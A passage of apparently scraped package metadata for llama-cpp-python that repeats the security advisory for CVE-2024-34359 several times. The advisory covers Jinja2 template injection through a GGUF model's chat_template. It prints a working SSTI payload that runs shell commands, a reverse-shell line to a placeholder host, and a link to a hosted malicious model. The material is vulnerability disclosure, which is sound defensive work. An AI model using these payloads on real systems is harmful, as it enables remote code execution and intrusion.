/tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.69":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.69/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.69","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"f5ffda2ef42c64e7716fa49c76933a8e551fba20dafec87f7040ec53d01d4f2d","md5":"749c21de843b13865408b7519bfe1dcf","sha256":"b37e864b4d9f7ac286a3e926d87afab2f136ae9290e11088f7a205b80d3c04a9"},"downloads":-1,"filename":"llama_cpp_python-0.2.69.tar.gz","has_sig":false,"md5_digest":"749c21de843b13865408b7519bfe1dcf","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":42487572,"upload_time":"2024-05-02T16:10:16","upload_time_iso_8601":"2024-05-02T16:10:16.728003Z","url":"https://files.pythonhosted.org/packages/f5/ff/da2ef42c64e7716fa49c76933a8e551fba20dafec87f7040ec53d01d4f2d/llama_cpp_python-0.2.69.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.7":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.7/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.7","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"b178bd5e6653102ea16ce53a044cec606f257811da99c9c2a760af6a93cdfef3","md5":"9e7349431fa189023981353aacdba2f7","sha256":"2267d3e90bf461ee581dc78332007ea15d9b40e79471850455458b399e3f1887"},"downloads":-1,"filename":"llama_cpp_python-0.2.7.tar.gz","has_sig":false,"md5_digest":"9e7349431fa189023981353aacdba2f7","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":1559658,"upload_time":"2023-09-25T18:45:53","upload_time_iso_8601":"2023-09-25T18:45:53.604371Z","url":"https://files.pythonhosted.org/packages/b1/78/bd5e6653102ea16ce53a044cec606f257811da99c9c2a760af6a93cdfef3/llama_cpp_python-0.2.7.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.70":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.70/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.70","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"0f6a382c0bf11983cde1d6a6b5c79b5da3426792198ce3397eeecc042a8d559b","md5":"94383ca47c5bdfbbda052a084a9ea93f","sha256":"12d046bed7900f46c0b6b3df37f20aa24049477e0cd93c6b69b97754cb0ed842"},"downloads":-1,"filename":"llama_cpp_python-0.2.70.tar.gz","has_sig":false,"md5_digest":"94383ca47c5bdfbbda052a084a9ea93f","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":46380000,"upload_time":"2024-05-08T06:39:21","upload_time_iso_8601":"2024-05-08T06:39:21.602087Z","url":"https://files.pythonhosted.org/packages/0f/6a/382c0bf11983cde1d6a6b5c79b5da3426792198ce3397eeecc042a8d559b/llama_cpp_python-0.2.70.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> 